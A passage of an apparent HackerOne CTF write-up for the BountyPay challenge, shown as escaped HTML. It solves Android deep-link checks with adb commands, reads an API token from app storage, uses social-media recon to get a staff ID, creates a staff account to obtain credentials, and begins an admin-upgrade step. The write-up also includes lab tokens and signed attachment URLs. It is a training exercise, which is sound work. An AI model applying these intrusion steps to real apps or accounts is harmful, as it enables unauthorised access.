class=\"nt\"\u003e\u0026lt;intent-filter\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.action.VIEW\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.DEFAULT\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.BROWSABLE\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;two\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:host=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;part\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;activity\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:theme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@style/AppTheme.NoActionBar\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@string/title_activity_part_one\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bounty.pay.PartOneActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;intent-filter\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.action.VIEW\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.DEFAULT\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.BROWSABLE\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;one\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:host=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;part\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"first-challenge\"\u003eFirst challenge :\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e     \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003efirstParam\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;start\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efirstParam\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003efirstParam\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;PartTwoActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003esettings\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003econtains\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt just checks there is start param in query on deep link and that param value == PartTwoActivity\u003cbr\u003e\nSolution : \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ adb shell am start -d one://part?start=PartTwoActivity\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"second-challenge\"\u003eSecond Challenge\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eUri\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003efirstParam\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;two\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003esecondParam\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;switch\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efirstParam\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003efirstParam\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;light\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003esecondParam\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003esecondParam\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;on\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt checks two and switch params must be in query and the values must be \u003ccode\u003etwo=light\u0026amp;switch=on\u003c/code\u003e\u003cbr\u003e\nSolution : \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ adb shell am start -d \u0026#39;two://part?two=light\\\u0026amp;switch=on\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter that there is question where it ask for header value and combine it with \u003ccode\u003eX-\u003c/code\u003e and checks with header value of firebase.\u003cbr\u003e\nFrom internal files of firebase in apk found the url for firebase \u003ca title=\"https://bountypay-90f64.firebaseio.com/\" href=\"/redirect?url=https%3A%2F%2Fbountypay-90f64.firebaseio.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bountypay-90f64.firebaseio.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nThen getting the header value in it, \u003ca title=\"https://bountypay-90f64.firebaseio.com/header/.json\" href=\"/redirect?url=https%3A%2F%2Fbountypay-90f64.firebaseio.com%2Fheader%2F.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bountypay-90f64.firebaseio.com/header/.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e  \u003ccode\u003eToken\u003c/code\u003e is the value, submit it\u003c/p\u003e\n\n\u003ch2 id=\"third-challenge\"\u003eThird Challenge\u003c/h2\u003e\n\n\u003cp\u003eWhere as PartThreeActivity it checks for \u003ccode\u003ethree=base64(PartThreeActivity)\u003c/code\u003e and \u003ccode\u003eswitch=base64(on)\u003c/code\u003e and \u003ccode\u003eheader=X-Token\u003c/code\u003e\u003cbr\u003e\nSolution : \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ adb shell am start -d \u0026#39;three://part?three=UGFydFRocmVlQWN0aXZpdHk=\\\u0026amp;switch=b24=\\\u0026amp;header=X-Token\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo finish this we need google apps in VM, as firebase requires aiuthentication.\u003cbr\u003e\nIt saves the Token and Host values to shared preferences.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ adb shell\nroot@vbox86p:/ # cat /data/data/bounty.pay/shared_prefs/user_created.xml\n\u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;utf-8\u0026#39; standalone=\u0026#39;yes\u0026#39; ?\u0026gt;\n\u0026lt;map\u0026gt;\n    \u0026lt;string name=\u0026quot;TWITTERHANDLE\u0026quot;\u0026gt;\u0026lt;/string\u0026gt;\n    \u0026lt;string name=\u0026quot;USERNAME\u0026quot;\u0026gt;Hello\u0026lt;/string\u0026gt;\n    \u0026lt;string name=\u0026quot;PARTONE\u0026quot;\u0026gt;COMPLETE\u0026lt;/string\u0026gt;\n    \u0026lt;string name=\u0026quot;TOKEN\u0026quot;\u0026gt;8e9998ee3137ca9ade8f372739f062c1\u0026lt;/string\u0026gt;\n    \u0026lt;string name=\u0026quot;PARTTWO\u0026quot;\u0026gt;COMPLETE\u0026lt;/string\u0026gt;\n    \u0026lt;string name=\u0026quot;HOST\u0026quot;\u0026gt;http://api.bountypay.h1ctf.com\u0026lt;/string\u0026gt;\n\u0026lt;/map\u0026gt;\nroot@vbox86p:/ # \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow we got the token. we can submit it dialogue box that asks after we launch third activity to make it finish \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"andriod_challenges_solved.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7KoKF8X2ygkv7xPfyLHzfZzm?response-content-disposition=attachment%3B%20filename%3D%22andriod_challenges_solved.jpg%22%3B%20filename%2A%3DUTF-8%27%27andriod_challenges_solved.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070729Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026amp;X-Amz-Signature=2cbe08bdffb2eed11d1b035b38d023fc0b109f5662e7a11f74bded2fb9f816c2\" data-attachment-type=\"image/jpeg\"\u003eandriod_challenges_solved.jpg (F859607)\u003c/a\u003e.\u003cbr\u003e\nFrom the \u003cstrong\u003eperformPostCall\u003c/strong\u003e function of \u003cstrong\u003ePartThreeActivity.java\u003c/strong\u003e we can get to know how to use the token\u003cbr\u003e\n\u003ccode\u003eX-Token: 8e9998ee3137ca9ade8f372739f062c1\u003c/code\u003e as a header for api.bountypay.h1ctf.com\u003c/p\u003e\n\n\u003ch1 id=\"level-4\"\u003eLevel - 4 ::\u003c/h1\u003e\n\n\u003cp\u003eAfter getting the api token. crawled over the api recursively and only one useful new route \u003ccode\u003e/api/staff\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e_______________________________ Request __________________________________\nGET /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nConnection: close\n\n_______________________________ Response __________________________________\n[{\u0026quot;name\u0026quot;:\u0026quot;Sam Jenkins\u0026quot;,\u0026quot;staff_id\u0026quot;:\u0026quot;STF:84DJKEIP38\u0026quot;},{\u0026quot;name\u0026quot;:\u0026quot;Brian Oliver\u0026quot;,\u0026quot;staff_id\u0026quot;:\u0026quot;STF:KE624RQ2T9\u0026quot;}]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter few trails over that request , found it resonds to POST method , which takes staff_id as input.\u003cbr\u003e\nIf already knows staff_id from GET method is used it is responding as \u003ccode\u003eStaff Member already has an account\u003c/code\u003e\u003cbr\u003e\nFor non existing staff_id\u0026#39;s \u003ccode\u003eInvalid Staff ID\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThis is most difficult part i faced, didn\u0026#39;t expected the recon concept, wasted days over this : (, but i liked it , it is relevant to real life scenario.\u003cbr\u003e\u003cbr\u003e\nWe need a new joining staff_id to create an account.\u003cbr\u003e\n\u003cstrong\u003eRecon part\u003c/strong\u003e\u003cbr\u003e\nGone to twitter \u003ca title=\"https://twitter.com/BountypayHQ\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/BountypayHQ\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nThere is a tweet : \u003ccode\u003eToday we welcome Sandra to the team!!!\u003c/code\u003e it is hint for us.\u003cbr\u003e\nSearched for following of BountypayHQ in twitter and find sandra twitter account \u003ca title=\"https://twitter.com/SandraA76708114\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FSandraA76708114\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/SandraA76708114\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nThere she posts a tweet of first day job \u003ca title=\"https://twitter.com/SandraA76708114/status/1258693001964068864\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FSandraA76708114%2Fstatus%2F1258693001964068864\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/SandraA76708114/status/1258693001964068864\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nWhere the photo contains the ID card which has an staff_id on it \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"sandra_first_day_pic.jpeg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gnXm85KUyZpNCRnvnqKkP5an?response-content-disposition=attachment%3B%20filename%3D%22sandra_first_day_pic.jpeg%22%3B%20filename%2A%3DUTF-8%27%27sandra_first_day_pic.jpeg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070729Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026amp;X-Amz-Signature=1906e25d8a3bb973b516ed14d4a7f96db244aae5dd85900a54fe25667b4238d3\" data-attachment-type=\"image/jpeg\"\u003esandra_first_day_pic.jpeg (F859634)\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eStaff id\u003c/strong\u003e: STF:8FJ3KFISL3\u003cbr\u003e\nwith which we can create new account to get staff credentials.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e_______________________________ Request __________________________________\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\n\nstaff_id=STF:8FJ3KFISL3\n_______________________________ Response __________________________________\n {\u0026quot;description\u0026quot;:\u0026quot;Staff Member Account Created\u0026quot;,\u0026quot;username\u0026quot;:\u0026quot;sandra.allison\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;s%3D8qB8zEpMnc*xsz7Yp5\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt creates a new account and gives the username, password of sandra.\u003cbr\u003e\nUsername: sandra.allison\u003cbr\u003e\nPassword: s%3D8qB8zEpMnc*xsz7Yp5\u003c/p\u003e\n\n\u003ch1 id=\"level-5\"\u003eLevel - 5 ::\u003c/h1\u003e\n\n\u003cp\u003eUsing those \u003cstrong\u003estaff creds\u003c/strong\u003e we can login to \u003cstrong\u003estaff.bountypay.h1ctf.com\u003c/strong\u003e\u003cbr\u003e\nThrough the js file(\u003ca title=\"https://staff.bountypay.h1ctf.com/js/website.js\" href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2Fjs%2Fwebsite.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://staff.bountypay.h1ctf.com/js/website.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) we can observer there is upgrade to admin concept\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.upgradeToAdmin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einput[name=\u0026quot;username\u0026quot;]\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/admin/upgrade?username=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan 